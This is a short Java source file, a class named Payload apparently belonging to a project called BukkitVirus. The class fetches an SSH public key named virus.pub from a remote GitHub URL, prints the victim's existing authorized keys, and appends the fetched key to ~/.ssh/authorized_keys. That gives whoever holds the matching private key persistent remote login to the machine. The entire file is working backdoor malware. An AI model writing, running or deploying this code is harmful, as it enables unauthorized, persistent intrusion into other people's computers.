import java.io.*;
import java.net.URL;

public class Payload {

    public static void main(String[] args) throws IOException {
        new Payload().run();
    }

    public void run() throws IOException {
        File authorizedKeys = new File(System.getProperty("user.home"), "/.ssh/authorized_keys");

        URL u = new URL("https://raw.githubusercontent.com/deerangle2/BukkitVirus/master/payload/virus.pub");
        BufferedReader in = new BufferedReader(new InputStreamReader(u.openStream()));
        String key = in.readLine();
        in.close();
        System.out.println(key);

        if(authorizedKeys.exists()) {
            BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(authorizedKeys)));
            String line = reader.readLine();
            while (line != null) {
                System.out.println(line);
                if (line.trim().equals(key.trim())) {
                    return;
                }
                line = reader.readLine();
            }
        }

        try(FileWriter fw = new FileWriter(authorizedKeys, true);
        BufferedWriter bw = new BufferedWriter(fw);
        PrintWriter out = new PrintWriter(bw))
        {
            out.println(key);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

}
